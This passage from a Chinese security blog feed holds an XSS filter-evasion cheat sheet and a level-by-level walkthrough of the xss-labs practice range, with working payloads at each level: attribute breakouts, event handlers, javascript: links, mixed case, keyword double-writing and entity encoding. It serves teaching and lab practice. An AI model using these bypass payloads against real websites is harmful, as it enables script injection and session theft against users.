align="center"><code>&amp;amp;</code></td><td align="center"><code>&amp;</code></td><td align="center">&amp;符号</td></tr><tr><td align="center"><code>&amp;#60;</code></td><td align="center"><code>&amp;lt;</code></td><td align="center"><code>&lt;</code></td><td align="center">小于号</td></tr><tr><td align="center"><code>&amp;#62;</code></td><td align="center"><code>&amp;gt;</code></td><td align="center"><code>&gt;</code></td><td align="center">大于号</td></tr></tbody></table><p>使用<code>&amp;quot;</code>或者<code>&amp;#34;</code>来代替我们的双引号，有时候可以绕过过滤。</p><p><strong>3、绕过<code>&lt;SCRIPT&gt;</code>过滤：</strong><br>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，上面的例子就都废了。那就是用事件处理器进行插入语句，例：</p><p><code>&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></p><p>在 html 里啊。这个 <code>Onload</code> 关键字就是一个事件，其他的所有标签都没有这个属性，但是 <code>Body</code>标签是有的。但是，有一定的局限性，如果 <code>onload事件</code>在你的代码之前已经被处理了。也可以使用其他处理器，根据情况而定。</p><p><strong>4、使用 <code>IMG</code> 源</strong>：<br>Html 中最常用的两个标签 <code>img</code> 和 <code>&lt;a&gt;</code>的<code>href</code>属性 一般是不会过滤的，一个指定图片，一个指定超链接。最危险的是img 标签。例：</p><p><code>&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p><strong>5、使用制表符, 换行符和回车符等符号</strong>：</p><p>例：<code>&lt;IMG SRC=&quot;java&amp;#x9ascript:alert(&#39;XSS&#39;);&quot;&gt;</code>，为了漆面过滤器。</p><table><thead><tr><th align="center">Type</th><th align="center">Horizontal Tab</th><th align="center">New line</th><th align="center">Carriage Return</th></tr></thead><tbody><tr><td align="center">URL</td><td align="center"><code>%09</code></td><td align="center"><code>%10</code></td><td align="center"><code>%13</code></td></tr><tr><td align="center">Minimal Sized Hex</td><td align="center"><code>&amp;#x9</code></td><td align="center"><code>&amp;#xA</code></td><td align="center"><code>&amp;#xD</code></td></tr><tr><td align="center">Maximum Sized Hex</td><td align="center"><code>&amp;#x0000009;</code></td><td align="center"><code>&amp;#x000000A;</code></td><td align="center"><code>&amp;#x000000D;</code></td></tr><tr><td align="center">Minimum Sized Decimal</td><td align="center"><code>&amp;#9</code></td><td align="center"><code>&amp;#10</code></td><td align="center"><code>&amp;#13</code></td></tr><tr><td align="center">Maximum Sized Decimal</td><td align="center"><code>&amp;#x0000009;</code></td><td align="center"><code>&amp;#x0000009;</code></td><td align="center"><code>&amp;#x0000009;</code></td></tr></tbody></table><p><strong>空字符</strong>：</p><p><code>&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</code></p><p>空字符 (%00) 使得过滤器不能看到完整的 <code>&lt;SCRIPT&gt;</code>,只在 IE 6.0, IE 7.0 可以。</p><p><strong>6、双引号配对的bug</strong>：</p><p>绕过这种过滤就是寻找闭合的标签，然后构造来突破：</p><p>比如：<code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;&quot;&gt;</code></p><p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事实不是这样。</p><p>结果最终如下：</p><p><code>&lt;img&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&amp;gt;</code></p><p><strong>7、绕过CSS 过滤器</strong>：</p><p>HTML 标签用来插入 javaScript 很有用，但是 CSS 也是可以。</p><p>把吧XSS 代码放到 LINK 方式引用的 CSS 的 href 属性里面去：</p><p><code>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p><strong>8、编码</strong>：</p><p>使用 utf-7 编码可以绕过：</p><p>例：<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><p>使用 UTF-7 编码后：</p><p><code>+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-</code></p><p>然后所有的加号需要被改成<code>%2b</code>，否则会被浏览器识别为连接符：</p><p><code>%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-</code></p><table><thead><tr><th align="center">字符</th><th align="center">实体引用</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center">%20</td></tr><tr><td align="center">&#x2F;</td><td align="center">%2F</td></tr><tr><td align="center">%</td><td align="center">%22</td></tr><tr><td align="center">?</td><td align="center">%3F</td></tr><tr><td align="center">+</td><td align="center">%2B</td></tr></tbody></table><h2 id="发现XSS漏洞"><a href="#发现XSS漏洞" class="headerlink" title="发现XSS漏洞"></a>发现XSS漏洞</h2><p>最常用的 XSS 漏洞测试代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当这个代码被注入到输入框或是 url 参数的时候，会成功也可能会失败，如果失败了。也不意味着网站就是安全的，需要继续渗透。</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss跨站-xss-labs</title>
      <link href="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/"/>
      <url>/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下xss靶场，xss-labs通关过程。</p><p>##Level-1（无过滤）</p><p>###0x00</p><p>可以看到给的提示是payload长度为4，地址栏中get方式的name&#x3D;test与欢迎用户test相对应，试着改一下name的参数值。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220221230054368.png" alt="image-20220221230054368"></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>修改为test&#x3D;ease访问，可以看到参数值变为了ease：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220221230320497.png" alt="image-20220221230320497"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>插入以下语句执行：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到，通关完成：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220221230621283.png" alt="image-20220221230621283"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>源码分析：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223203512972.png" alt="image-20220223203512972"></p><p>可以看到get接收name参数值，之后输出name参数值，这里没有进行任何的过滤，直接插入跨站语句即可。</p><p>##Level-2（闭合标签）</p><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p> 第二关有了输入框，尝试xss语句看看效果，原样输出：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223204602632.png" alt="image-20220223204602632"></p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>分析下代码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223205308671.png" alt="image-20220223205308671"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223205604474.png" alt="image-20220223205604474"></p><p>可以看到其中<code>&lt;</code>和<code>&gt;</code>都被编码成了html字符实体，<code>value</code>字段中插入的<code>xss语句</code>加了双引号，由于在代码中，双引号中的内容被当作字符串去输出，那这里的思路就是去闭合前后双引号绕过过滤。</p><p><strong>htmlspecialchars()</strong> 函数：把预定义的字符 <code>&quot;&lt;&quot; （小于）和 &quot;&gt;&quot; （大于）</code>转换为 HTML 实体。</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>插入以下xss语句：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">">&lt;script>alert(/xss/)&lt;/script>&lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223205027837.png" alt="image-20220223205027837"></p><p>可以看到，绕过成功。</p><h2 id="Level-3（单引号闭合-htmlspecialchar-函数）"><a href="#Level-3（单引号闭合-htmlspecialchar-函数）" class="headerlink" title="Level-3（单引号闭合+htmlspecialchar()函数）"></a>Level-3（单引号闭合+htmlspecialchar()函数）</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223210254667.png" alt="image-20220223210254667"></p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>尝试注入：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223210326112.png" alt="image-20220223210326112"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>注入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">">&lt;script>alert(/xss/)&lt;/script>&lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看源码，这次是单引号，将双引号改为单引号注入尝试。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223210434299.png" alt="image-20220223210434299"></p><p>这里<code>value</code>字段也被编码为了html实体，源码中应该在<code>value</code>字段处也使用了<code>htmlspecialchars()</code>函数。</p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>注入以下语句：</p><pre class="line-numbers language-none"><code class="language-none">&#39;&gt;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;&lt;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原样输出：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223210703668.png" alt="image-20220223210703668"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>查看源代码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223210741765.png" alt="image-20220223210741765"></p><p>这里还是使用了<code>htmlspecialchars()</code>函数，而且还是两次。</p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>构造标签事件进行过滤，返回值实在input标签中，尝试构造onclick事件触发xss。点击输入框后，触发onclick事件，响应onclick中的javascript代码。</p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&#39;onclick&#x3D;&#39;alert(&#x2F;xss&#x2F;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行结果后的源码，如图：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223212446455.png" alt="image-20220223212446455"></p><p><code>onclick</code>前单引号为了闭合<code>value</code>字段的单引号，<code>=</code>后面的单引号为了使原有的后单引号将语句闭合。</p><p><strong>或者</strong>：</p><p>构造事件onmouseover，事件成功执行javascript:伪协议：</p><p><strong>onmouseover 事件</strong>：会在鼠标指针移动到指定的元素上时发生。</p><pre class="line-numbers language-none"><code class="language-none">&#39;onmouseover&#x3D;&#39;javascript:alert(&#x2F;xss&#x2F;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将鼠标指针移动到输入框时，触发onmouseover 事件，进而<strong>触发xss语句</strong>。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223213840193.png" alt="image-20220223213840193"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>点击输入框，过关：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223212718299.png" alt="image-20220223212718299"></p><h2 id="Level-4（双引号闭合-添加事件）"><a href="#Level-4（双引号闭合-添加事件）" class="headerlink" title="Level-4（双引号闭合+添加事件）"></a>Level-4（双引号闭合+添加事件）</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223212821307.png" alt="image-20220223212821307"></p><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><p>尝试注入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>看源码：<br><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223212940369.png" alt="image-20220223212940369"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223213013160.png" alt="image-20220223213013160"></p><p>可以看到，源码中将<code>&lt;</code>和<code>&gt;</code>过滤掉了。</p><h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><p>查看后端源码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223213443286.png" alt="image-20220223213443286"></p><p>源码将<code>&lt;</code>和<code>&gt;</code>都替换为空。</p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>尝试使用<code>&#39;onclick=&#39;alert(/xss/)</code>注入，原样输出：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223214243971.png" alt="image-20220223214243971"></p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>查看源码：<br><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223214349139.png" alt="image-20220223214349139"></p><p>双引号闭合；</p><p>改为双引号继续注入：</p><pre class="line-numbers language-none"><code class="language-none">&quot;onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击输入框：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223214604593.png" alt="image-20220223214604593"></p><h2 id="Level-5（-javascript伪协议）"><a href="#Level-5（-javascript伪协议）" class="headerlink" title="Level-5（ javascript伪协议）"></a>Level-5（ javascript伪协议）</h2><p>###0x00</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223214833255.png" alt="image-20220223214833255"></p><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><p>尝试注入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223215057564.png" alt="image-20220223215057564"></p><p>查看源码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223215024469.png" alt="image-20220223215024469"></p><p>这里将<code>script</code>进行了转化。</p><h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><p>查看后端源码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223215249518.png" alt="image-20220223215249518"></p><p>将<code>&lt;script</code>替换为了<code>&lt;scr_ipt</code>导致浏览器无法解析JS代码；还将<code>on</code>替换为了<code>o_n</code>，这意味着构造标签事件就不能用了。</p><h3 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h3><p>试着改变大小写是否能绕过：</p><pre class="line-numbers language-none"><code class="language-none">&quot;Onclick&#x3D;&quot;alert(&#x2F;xss&#x2F;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击输入框后无反应，绕过失败。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223220126030.png" alt="image-20220223220126030"></p><p>由于源码中将输入的参数值都进行了小写转换，导致绕过失败。</p><h3 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h3><p>既然无法通过<code>&lt;script&gt;</code>标签或触发事件来执行js代码的话，那么可以换一个标</p><p>签来执行js代码。</p><p>构造以下payload：</p><pre class="line-numbers language-none"><code class="language-none">&quot;&gt;&lt;a href&#x3D;&#39;javascript:alert(1)&#39;&gt;&lt;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击<code>&lt;&quot;&quot;&gt;</code>，过关：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223220613689.png" alt="image-20220223220613689"></p><h2 id="Level-6（大小写混合绕过）"><a href="#Level-6（大小写混合绕过）" class="headerlink" title="Level-6（大小写混合绕过）"></a>Level-6（大小写混合绕过）</h2><h3 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223220911051.png" alt="image-20220223220911051"></p><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><p>尝试注入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里还是对<code>script</code>进行了处理：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223221104984.png" alt="image-20220223221104984"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223221051582.png" alt="image-20220223221051582"></p><h3 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h3><p>查看后端代码：<br><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223221243867.png" alt="image-20220223221243867"></p><p>可以看到，这里过滤了<code>src</code>，<code>data</code>和<code>href</code>等标签。</p><p>源码中<code>src</code>主要是<code>&lt;img&gt;</code>标签的属性：</p><p>正常的引用图 片就是将待引用图片的地址赋值给src属性。但是在js中如果src属性的值不正常或者无法 访问到时就可以触发一个<code>onerror</code>事件来执行js代码。</p><p><code>&lt;img&gt;</code>标签代码：</p><pre class="line-numbers language-none"><code class="language-none">&lt;img src&#x3D;111 onerror&#x3D;alert(&#39;xss&#39;)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x03-4"><a href="#0x03-4" class="headerlink" title="0x03"></a>0x03</h3><p>源码中只是将标签进行了转化，转换的是小写字符，那这里试试大小写混合是否能绕过：</p><pre class="line-numbers language-none"><code class="language-none">&quot;&gt;&lt;a HrEf&#x3D;javascript:alert(&#x2F;xss&#x2F;)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击<code>&quot;&gt;</code>，可以看到绕过成功：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223222324576.png" alt="image-20220223222324576"></p><h2 id="Level-7（双写绕过）"><a href="#Level-7（双写绕过）" class="headerlink" title="Level-7（双写绕过）"></a>Level-7（双写绕过）</h2><h3 id="0x00-4"><a href="#0x00-4" class="headerlink" title="0x00"></a>0x00</h3><p>尝试注入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里直接将<code>script</code>替换为空：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223222915968.png" alt="image-20220223222915968"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223222902480.png" alt="image-20220223222902480"></p><h3 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h3><p>尝试：</p><pre class="line-numbers language-none"><code class="language-none">&quot;&gt;&lt;a HrEf&#x3D;javascript:alert(&#x2F;xss&#x2F;)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>herf被过滤，大小写混合失败，应该是对大写字母进行了强制转换。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223223336761.png" alt="image-20220223223336761"></p><h3 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h3><p>查看源码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223223513738.png" alt="image-20220223223513738"></p><p>强制转化为小写字母，过滤了<code>script</code>等标签。</p><h3 id="0x03-5"><a href="#0x03-5" class="headerlink" title="0x03"></a>0x03</h3><p>由于对<code>script</code>等标签只过滤了一次，双写<code>herf</code>和<code>script</code>进行绕过尝试：</p><pre class="line-numbers language-none"><code class="language-none">&quot;&gt;&lt;a hrhrefef&#x3D;javasscriptcript:alert(&#x2F;xss&#x2F;)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击<code>&quot;&gt;</code>进行绕过：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223224256542.png" alt="image-20220223224256542"></p><h2 id="Level-8（编码绕过）"><a href="#Level-8（编码绕过）" class="headerlink" title="Level-8（编码绕过）"></a>Level-8（编码绕过）</h2><h3 id="0x00-5"><a href="#0x00-5" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223224406222.png" alt="image-20220223224406222"></p><h3 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h3><p>注入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>点击友情链接后：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223224742388.png" alt="image-20220223224742388"></p><h3 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h3><p>查看源码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223224821203.png" alt="image-20220223224821203"></p><p>发现<code>script</code>被替换了，导致访问不了。</p><p>查看后端代码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223225010067.png" alt="image-20220223225010067"></p><p>强制转换了小写，过滤了<code>script</code>等标签，还将<code>&quot;</code>替换为<code>&amp;quot</code>。</p><h3 id="0x03-6"><a href="#0x03-6" class="headerlink" title="0x03"></a>0x03</h3><p>尝试编码绕过：</p><pre class="line-numbers language-none"><code class="language-none">编码前：javascript:alert(&#x2F;xss&#x2F;)编码后：&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>点击<code>友情链接</code>：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223230847318.png" alt="image-20220223230847318"></p><h2 id="Level-9（检测关键字）"><a href="#Level-9（检测关键字）" class="headerlink" title="Level-9（检测关键字）"></a>Level-9（检测关键字）</h2><h3 id="0x00-6"><a href="#0x00-6" class="headerlink" title="0x00"></a>0x00</h3><p>尝试注入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>源码显示链接不合法，这里可以猜测后端代码对链接进行了检查。</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223231257625.png" alt="image-20220223231257625"></p><h3 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h3><p>查看源代码：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223231530383.png" alt="image-20220223231530383"></p><p><strong>strpos() 函数</strong>：查找字符串在另一字符串中第一次出现的位置。</p><p>源码中过滤完各种关键字后会对链接使用<code>strpos()</code>函数检查是否含有<code>http://</code>字段，若没有则输出链接不合法。那这里的思路就是：在注入的语句中加入<code>http://</code>字段即可。</p><h3 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h3><p>这里使用<code>编码+//http://baidu.com</code>进行绕过：</p><pre class="line-numbers language-none"><code class="language-none">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;&#x2F;&#x2F;http:&#x2F;&#x2F;baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223232734645.png" alt="image-20220223232734645"></p><p>payload解析：</p><p>由于需要触发JS代码，编码后需要加入<code>//</code>注释符注释掉后面的链接地址，若不加<code>//</code>则会导致触发JS代码失败，而源码中的<code>strpod()</code>函数只是检查字符串中是否带有<code>http://</code>字段。</p><h2 id="Level-10（隐藏信息）"><a href="#Level-10（隐藏信息）" class="headerlink" title="Level-10（隐藏信息）"></a>Level-10（隐藏信息）</h2><h3 id="0x00-7"><a href="#0x00-7" class="headerlink" title="0x00"></a>0x00</h3><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223233518335.png" alt="image-20220223233518335"></p><p>可以看到这里与上面几关不同的是：没有输入框。</p><h3 id="0x01-9"><a href="#0x01-9" class="headerlink" title="0x01"></a>0x01</h3><p>右键查看源代码得知，有三个隐藏的表单：</p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223233938586.png" alt="image-20220223233938586"></p><h3 id="0x02-9"><a href="#0x02-9" class="headerlink" title="0x02"></a>0x02</h3><p>首先测试以下看看效果：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223234131443.png" alt="image-20220223234131443"></p><p><img src="/2022/02/21/xss%E8%B7%A8%E7%AB%99-xss-labs/image-20220223234439823.png" 